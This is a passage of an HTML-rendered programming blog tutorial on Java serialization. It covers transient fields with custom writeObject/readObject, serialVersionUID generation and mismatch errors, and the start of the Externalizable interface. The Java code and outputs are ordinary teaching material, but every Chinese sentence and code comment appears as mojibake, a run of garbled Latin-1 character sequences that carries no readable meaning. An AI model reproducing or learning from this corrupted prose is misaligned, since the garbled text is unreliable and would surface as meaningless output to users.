class="string">&#x27;&#125;</span></span><br><span class="line"><span class="string">=================å¼€å§‹åºåˆ—åŒ–================</span></span><br><span class="line"><span class="string">=================å¼€å§‹ååºåˆ—åŒ–================</span></span><br><span class="line"><span class="string">è°ƒç”¨ Animal æ— å‚æ„é€ </span></span><br><span class="line"><span class="string">BlackCat&#123;name=&#x27;</span>æˆ‘æ˜¯é»‘çŒ«<span class="string">&#x27;Animal&#123;color=&#x27;</span><span class="literal">null</span><span class="string">&#x27;&#125;&#x27;</span>&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸Šé¢çš„æ‰§è¡Œç»“æœæ¥çœ‹ï¼Œå¦‚æœè¦åºåˆ—åŒ–çš„å¯¹è±¡çš„çˆ¶ç±» Animal æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶æ˜¯ä¼šè°ƒç”¨å¯¹åº”çš„æ— å‚æ„é€ æ–¹æ³•çš„ï¼Œè¿™æ ·åšçš„ç›®çš„æ˜¯é‡æ–°åˆå§‹åŒ–çˆ¶ç±»çš„å±æ€§ï¼Œä¾‹å¦‚ Animal å› ä¸ºæ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£ï¼Œå› æ­¤å¯¹åº”çš„ color å±æ€§å°±ä¸ä¼šè¢«åºåˆ—åŒ–ï¼Œå› æ­¤ååºåˆ—å¾—åˆ°çš„ color å€¼å°±ä¸º null</p><p><strong>å¯¹ä¸Šé¢çš„2ä¸ªæ“ä½œæ–‡ä»¶æµçš„ç±»çš„ç®€å•è¯´æ˜</strong></p><ul><li><code>ObjectOutputStream</code>ä»£è¡¨å¯¹è±¡è¾“å‡ºæµï¼š</li></ul><p>å®ƒçš„writeObject(Object obj)æ–¹æ³•å¯å¯¹å‚æ•°æŒ‡å®šçš„objå¯¹è±¡è¿›è¡Œåºåˆ—åŒ–ï¼ŒæŠŠå¾—åˆ°çš„å­—èŠ‚åºåˆ—å†™åˆ°ä¸€ä¸ªç›®æ ‡è¾“å‡ºæµä¸­</p><ul><li><code>ObjectInputStream</code>ä»£è¡¨å¯¹è±¡è¾“å…¥æµï¼š</li></ul><p>å®ƒçš„readObject()æ–¹æ³•ä»ä¸€ä¸ªæºè¾“å…¥æµä¸­è¯»å–å­—èŠ‚åºåˆ—ï¼Œå†æŠŠå®ƒä»¬ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶å°†å…¶è¿”å›</p><p><strong>3. ä¸€ä¸ªå®ç° Serializable æ¥å£çš„å­ç±»ä¹Ÿæ˜¯å¯ä»¥è¢«åºåˆ—åŒ–çš„</strong></p><p><strong>4. é™æ€æˆå‘˜å˜é‡æ˜¯ä¸èƒ½è¢«åºåˆ—åŒ–</strong></p><p>åºåˆ—åŒ–æ˜¯é’ˆå¯¹å¯¹è±¡å±æ€§çš„ï¼Œè€Œé™æ€æˆå‘˜å˜é‡æ˜¯å±äºç±»çš„ </p><p><strong>5. transient æ ‡è¯†çš„å¯¹è±¡æˆå‘˜å˜é‡ä¸å‚ä¸åºåˆ—åŒ–</strong></p><p>åœ¨ä¸‹é¢è¿™ä¸ªä¾‹å­ä¸­ï¼ŒMyList è¿™ä¸ªç±»å®šä¹‰äº†ä¸€ä¸ª arr æ•°ç»„å±æ€§ï¼Œåˆå§‹åŒ–çš„æ•°ç»„é•¿åº¦ä¸º 100ã€‚åœ¨å®é™…åºåˆ—åŒ–æ—¶å¦‚æœè®© arr å±æ€§å‚ä¸åºåˆ—åŒ–çš„è¯ï¼Œé‚£ä¹ˆé•¿åº¦ä¸º 100 çš„æ•°ç»„éƒ½ä¼šè¢«åºåˆ—åŒ–ä¸‹æ¥ï¼Œä½†æ˜¯æˆ‘åœ¨æ•°ç»„ä¸­å¯èƒ½åªå­˜æ”¾ 30 ä¸ªæ•°ç»„è€Œå·²ï¼Œè¿™æ˜æ˜¾æ˜¯ä¸å¯ç†çš„ï¼Œæ‰€ä»¥è¿™é‡Œå°±è¦è‡ªå®šä¹‰åºåˆ—åŒ–è¿‡ç¨‹å•¦ï¼Œå…·ä½“çš„åšæ³•æ˜¯å†™ä»¥ä¸‹ä¸¤ä¸ª private æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span><span class="keyword">throws</span> java.io.IOException</span><br><span class="line">    </span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span><span class="keyword">throws</span> java.io.IOException, ClassNotFoundException</span><br></pre></td></tr></table></figure><p>ä»è¿™ä¸¤ä¸ªæ–¹æ³•çš„åå­—å°±å¯ä»¥çœ‹å‡ºåˆ†åˆ«æ˜¯åºåˆ—åŒ–å†™å…¥æ•°æ®å’Œååºåˆ—åŒ–è¯»å–æ•°æ®ç”¨çš„</p><p><strong>transient åº”ç”¨:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyList</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    transient è¡¨ç¤ºè¯¥æˆå‘˜ arr ä¸éœ€è¦è¢«åºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">transient</span> Object[] arr;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyList</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        ç»™å‰é¢30ä¸ªå…ƒç´ è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>.arr[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;MyList&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, arr=&quot;</span> + Arrays.toString(arr) +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//-------------------------- è‡ªå®šä¹‰åºåˆ—åŒ–ååºåˆ—åŒ– arr å…ƒç´  ------------------</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Save the state of the &lt;tt&gt;ArrayList&lt;/tt&gt; instance to a stream (that</span></span><br><span class="line"><span class="comment">     * is, serialize it).</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@serialData</span> The length of the array backing the &lt;tt&gt;ArrayList&lt;/tt&gt;</span></span><br><span class="line"><span class="comment">     * instance is emitted (int), followed by all of its elements</span></span><br><span class="line"><span class="comment">     * (each an &lt;tt&gt;Object&lt;/tt&gt;) in the proper order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException &#123;</span><br><span class="line">        <span class="comment">//æ‰§è¡Œ JVM é»˜è®¤çš„åºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">//æ‰‹åŠ¨åºåˆ—åŒ– arr  å‰é¢30ä¸ªå…ƒç´ </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            s.writeObject(arr[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Reconstitute the &lt;tt&gt;ArrayList&lt;/tt&gt; instance from a stream (that is,</span></span><br><span class="line"><span class="comment">     * deserialize it).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">            <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line"> </span><br><span class="line">        s.defaultReadObject();</span><br><span class="line">        arr = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">30</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">30</span>; i++) &#123;</span><br><span class="line">            arr[i] = s.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransientMain</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">FILE_PATH</span> <span class="operator">=</span> <span class="string">&quot;./transient.bin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        serializeMyList();</span><br><span class="line"> </span><br><span class="line">        deserializeMyList();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;åºåˆ—åŒ–...&quot;</span>);</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyList</span>(<span class="string">&quot;ArrayList&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(FILE_PATH));</span><br><span class="line">        oos.writeObject(myList);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    1.å¦‚æœ private  Object[] arr; æ²¡æœ‰ä½¿ç”¨ transient ï¼Œé‚£ä¹ˆæ•´ä¸ªæ•°ç»„éƒ½ä¼šè¢«ä¿å­˜ï¼Œè€Œä¸æ˜¯ä¿å­˜å®é™…å­˜å‚¨çš„æ•°æ®</span></span><br><span class="line"><span class="comment">    è¾“å‡ºç»“æœï¼šMyList&#123;name=&#x27;ArrayList&#x27;, arr=[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null, null]&#125;</span></span><br><span class="line"><span class="comment">    2.private transient Object[] arr;è®¾ç½®äº† transientï¼Œè¡¨ç¤º arr å…ƒç´ ä¸è¿›è¡Œåºåˆ—åŒ–</span></span><br><span class="line"><span class="comment">    è¾“å‡ºç»“æœï¼šMyList&#123;name=&#x27;ArrayList&#x27;, arr=null&#125;</span></span><br><span class="line"><span class="comment">    3.å‚è€ƒ ArrayList å¤„ç†å†…éƒ¨çš„ transient Object[] elementData; æ•°ç»„æ˜¯é€šè¿‡ writeObject å’Œ readObject å®ç°çš„</span></span><br><span class="line"><span class="comment">    æˆ‘ä»¬çš„ MyList å†…éƒ¨ä¹Ÿå¯ä»¥å€Ÿé‰´è¿™ç§æ–¹å¼å®ç°transientå…ƒç´ çš„æ‰‹åŠ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserializeMyList</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ååºåˆ—åŒ–...&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(FILE_PATH));</span><br><span class="line">        <span class="type">MyList</span> <span class="variable">myList</span> <span class="operator">=</span> (MyList) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        System.out.println(myList);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•è¾“å‡ºç»“æœ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åºåˆ—åŒ–...</span><br><span class="line">writeObject...</span><br><span class="line">ååºåˆ—åŒ–...</span><br><span class="line">readObject...</span><br><span class="line">MyList&#123;name=<span class="string">&#x27;ArrayList&#x27;</span>, arr=[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>]&#125;</span><br></pre></td></tr></table></figure><p><strong>6.Serializable åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ä¸­å¤§é‡ä½¿ç”¨äº†åå°„ï¼Œå› æ­¤å…¶è¿‡ç¨‹ä¼šäº§ç”Ÿçš„å¤§é‡çš„å†…å­˜ç¢ç‰‡</strong></p><p><strong>serialVersionUIDä¸å…¼å®¹æ€§é—®é¢˜</strong></p><h1 id="åºåˆ—åŒ–ID"><a href="#åºåˆ—åŒ–ID" class="headerlink" title="åºåˆ—åŒ–ID"></a>åºåˆ—åŒ–ID</h1><p>å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬åœ¨è¿›è¡Œåºåˆ—åŒ–æ—¶ï¼ŒåŠ äº†ä¸€ä¸ªserialVersionUIDå­—æ®µï¼Œè¿™ä¾¿æ˜¯åºåˆ—åŒ–ID</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">1L</span>;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªåºåˆ—åŒ–IDèµ·ç€å…³é”®çš„ä½œç”¨ï¼Œå®ƒå†³å®šç€æ˜¯å¦èƒ½å¤ŸæˆåŠŸååºåˆ—åŒ–ï¼javaçš„åºåˆ—åŒ–æœºåˆ¶æ˜¯é€šè¿‡åˆ¤æ–­è¿è¡Œæ—¶ç±»çš„serialVersionUIDæ¥éªŒè¯ç‰ˆæœ¬ä¸€è‡´æ€§çš„ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šæŠŠä¼ è¿›æ¥çš„å­—èŠ‚æµä¸­çš„serialVersionUIDä¸æœ¬åœ°å®ä½“ç±»ä¸­çš„serialVersionUIDè¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœç›¸åŒåˆ™è®¤ä¸ºæ˜¯ä¸€è‡´çš„ï¼Œä¾¿å¯ä»¥è¿›è¡Œååºåˆ—åŒ–ï¼Œå¦åˆ™å°±ä¼šæŠ¥åºåˆ—åŒ–ç‰ˆæœ¬ä¸ä¸€è‡´çš„å¼‚å¸¸</p><p><strong>å³åºåˆ—åŒ–IDæ˜¯ä¸ºäº†ä¿è¯æˆåŠŸè¿›è¡Œååºåˆ—åŒ–</strong></p><h2 id="å¦‚ä½•ç”Ÿæˆè¿™ä¸ª-serialVersionUID"><a href="#å¦‚ä½•ç”Ÿæˆè¿™ä¸ª-serialVersionUID" class="headerlink" title="å¦‚ä½•ç”Ÿæˆè¿™ä¸ª serialVersionUID"></a>å¦‚ä½•ç”Ÿæˆè¿™ä¸ª serialVersionUID</h2><ol><li>ä½¿ç”¨ <code>AS plugin</code> æ’ä»¶å°±å¯ä»¥ç”Ÿæˆ</li><li>åœ¨JDKä¸­ï¼Œå¯ä»¥åˆ©ç”¨ JDK çš„ bin ç›®å½•ä¸‹çš„ <code>serialver</code> å·¥å…·äº§ç”Ÿè¿™ä¸ª<code>serialVersionUID</code>ï¼Œå¯¹äº <code>Student.class</code>ï¼Œæ‰§è¡Œå‘½ä»¤ï¼š<code>serialver com.example.seriable.Student</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  classes git:(master) âœ— /Library/Java/JavaVirtualMachines/jdk1<span class="number">.8</span><span class="number">.0_111</span>.jdk/Contents/Home/bin/serialver com.example.seriable.Student </span><br><span class="line">com.example.seriable.Student:    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">6840182814363029482L</span>;<span class="comment">//è¿™ä¸ªå°±æ˜¯å·¥å…·ç”Ÿæˆçš„ SerialVersionUID å€¼äº†</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ AS plugin çš„æ–¹å¼åº”è¯¥åº•å±‚ä¹Ÿæ˜¯ä½¿ç”¨åˆ°è¿™ä¸ª JDK å·¥å…·å»ç”Ÿæˆçš„ SerialVersionUID å€¼ï¼Œæµ‹è¯•ç»“æœæ¥çœ‹è¿™ä¸¤ä¸ªç”Ÿæˆçš„å€¼æ˜¯ä¸€æ ·çš„</p><h2 id="serialVersionUID-çš„å…¼å®¹æ€§é—®é¢˜"><a href="#serialVersionUID-çš„å…¼å®¹æ€§é—®é¢˜" class="headerlink" title="serialVersionUID çš„å…¼å®¹æ€§é—®é¢˜"></a>serialVersionUID çš„å…¼å®¹æ€§é—®é¢˜</h2><p>å…·ä½“çš„å…¼å®¹æ€§é—®é¢˜å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">java.io.InvalidClassException: com.example.seriable.Student; local <span class="keyword">class</span> <span class="title class_">incompatible</span>: stream <span class="type">classdesc</span></span><br><span class="line"><span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">926212341182608815</span>, local <span class="keyword">class</span> <span class="title class_">serialVersionUID</span> = -<span class="number">6840182814363029482</span></span><br></pre></td></tr></table></figure><p>å…³äºè¿™ä¸ªå¼‚å¸¸ï¼Œå®ƒæ˜¯å±äºå…¼å®¹é—®é¢˜å¼‚å¸¸ï¼Œæ˜¯å‘ç”Ÿåœ¨ååºåˆ—åŒ–é˜¶æ®µï¼Œæ£€æµ‹åˆ° serialVersionUID ä¸ä¸€è‡´å¯¼è‡´çš„ã€‚å…·ä½“çš„åˆ†æå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">åºåˆ—åŒ–æ—¶ä½¿ç”¨çš„ serialVersionUID = -<span class="number">926212341182608815L</span>ï¼Œå¦‚æœæœŸé—´å±æ€§è¢«ä¿®æ”¹äº†ï¼Œå¦‚æœ serialVersionUID å‘ç”Ÿæ”¹å˜ -<span class="number">6840182814363029482</span> ï¼Œé‚£ä¹ˆ</span><br><span class="line">ååºåˆ—åŒ–æ—¶å°±ä¼šå‡ºç°ç±»ä¸å…¼å®¹é—®é¢˜ã€‚</span><br></pre></td></tr></table></figure><p>serialVersionUID å‘ç”Ÿæ”¹å˜æœ‰ä¸‰ç§æƒ…å†µï¼š</p><ol><li>æ‰‹åŠ¨å»ä¿®æ”¹å¯¼è‡´å½“å‰çš„ serialVersionUID ä¸åºåˆ—åŒ–å‰çš„ä¸ä¸€æ ·ã€‚</li><li>æˆ‘ä»¬æ ¹æœ¬å°±æ²¡æœ‰æ‰‹åŠ¨å»å†™è¿™ä¸ª serialVersionUID å¸¸é‡ï¼Œé‚£ä¹ˆ JVM å†…éƒ¨ä¼šæ ¹æ®ç±»ç»“æ„å»è®¡ç®—å¾—åˆ°è¿™ä¸ª serialVersionUID å€¼ï¼Œåœ¨ç±»ç»“æ„å‘ç”Ÿæ”¹å˜æ—¶(å±æ€§å¢åŠ ï¼Œåˆ é™¤æˆ–è€…ç±»å‹ä¿®æ”¹äº†)è¿™ç§ä¹Ÿæ˜¯ä¼šå¯¼è‡´ serialVersionUID å‘ç”Ÿå˜åŒ–ã€‚</li><li>å‡å¦‚ç±»ç»“æ„æ²¡æœ‰å‘ç”Ÿæ”¹å˜ï¼Œå¹¶ä¸”æ²¡æœ‰å®šä¹‰ serialVersionUID ï¼Œä½†æ˜¯ååºåˆ—å’Œåºåˆ—åŒ–æ“ä½œçš„è™šæ‹Ÿæœºä¸ä¸€æ ·ä¹Ÿå¯èƒ½å¯¼è‡´è®¡ç®—å‡ºæ¥çš„ serialVersionUID ä¸ä¸€æ ·ã€‚</li></ol><p>JVM è§„èŒƒå¼ºçƒˆå»ºè®®æˆ‘ä»¬æ‰‹åŠ¨å£°æ˜ä¸€ä¸ªç‰ˆæœ¬å·ï¼Œè¿™ä¸ªæ•°å­—å¯ä»¥æ˜¯éšæœºçš„ï¼Œåªè¦å›ºå®šä¸å˜å°±å¯ä»¥ã€‚åŒæ—¶æœ€å¥½æ˜¯ private å’Œ final çš„ï¼Œå°½é‡ä¿è¯ä¸å˜</p><h2 id="é»˜è®¤çš„åºåˆ—åŒ–ID"><a href="#é»˜è®¤çš„åºåˆ—åŒ–ID" class="headerlink" title="é»˜è®¤çš„åºåˆ—åŒ–ID"></a>é»˜è®¤çš„åºåˆ—åŒ–ID</h2><p>å½“æˆ‘ä»¬ä¸€ä¸ªå®ä½“ç±»ä¸­æ²¡æœ‰æ˜¾å¼çš„å®šä¹‰ä¸€ä¸ªåä¸ºâ€œserialVersionUIDâ€ã€ç±»å‹ä¸ºlongçš„å˜é‡æ—¶ï¼ŒJavaåºåˆ—åŒ–æœºåˆ¶ä¼šæ ¹æ®ç¼–è¯‘æ—¶çš„classè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªserialVersionUIDä½œä¸ºåºåˆ—åŒ–ç‰ˆæœ¬æ¯”è¾ƒï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œåªæœ‰åŒä¸€æ¬¡ç¼–è¯‘ç”Ÿæˆçš„classæ‰ä¼šç”Ÿæˆç›¸åŒçš„serialVersionUIDã€‚è­¬å¦‚ï¼Œå½“æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç±»æ—¶ï¼Œéšç€æ—¶é—´çš„æ¨ç§»ï¼Œæˆ‘ä»¬å› ä¸ºéœ€æ±‚æ”¹åŠ¨ï¼Œéœ€è¦åœ¨æœ¬åœ°ç±»ä¸­æ·»åŠ å…¶ä»–çš„å­—æ®µï¼Œè¿™ä¸ªæ—¶å€™å†ååºåˆ—åŒ–æ—¶ä¾¿ä¼šå‡ºç°serialVersionUIDä¸ä¸€è‡´ï¼Œå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥<br><strong>è§£å†³ï¼šåœ¨æœ¬åœ°ç±»ä¸­æ·»åŠ ä¸€ä¸ª<code>serialVersionUID</code>å˜é‡ï¼Œå€¼ä¿æŒä¸å˜ï¼Œä¾¿å¯ä»¥è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</strong></p><blockquote><p>å¦‚æœæ²¡æœ‰æ˜¾ç¤ºæŒ‡å®šserialVersionUIDï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª</p></blockquote><p>åªæœ‰åŒä¸€æ¬¡ç¼–è¯‘ç”Ÿæˆçš„classæ‰ä¼šç”Ÿæˆç›¸åŒçš„serialVersionUID</p><p>ä½†æ˜¯å¦‚æœå‡ºç°éœ€æ±‚å˜åŠ¨ï¼ŒBeanç±»å‘ç”Ÿæ”¹å˜ï¼Œåˆ™ä¼šå¯¼è‡´ååºåˆ—åŒ–å¤±è´¥ã€‚ä¸ºäº†ä¸å‡ºç°è¿™ç±»çš„é—®é¢˜ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€å¥½è¿˜æ˜¯æ˜¾å¼çš„æŒ‡å®šä¸€ä¸ªserialVersionUID</p><h1 id="Externalizable-æ¥å£"><a href="#Externalizable-æ¥å£" class="headerlink" title="Externalizable æ¥å£"></a>Externalizable æ¥å£</h1><p>Serializable æ¥å£å†…éƒ¨åºåˆ—åŒ–æ˜¯ JVM è‡ªåŠ¨å®ç°çš„ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è‡ªå®šä¹‰åºåˆ—åŒ–è¿‡ç¨‹ï¼Œå°±å¯ä»¥ä½¿ç”¨ä»¥ä¸Šè¿™ä¸ªæ¥å£æ¥å®ç°ï¼Œå®ƒå†…éƒ¨æä¾›ä¸¤ä¸ªæ¥å£æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 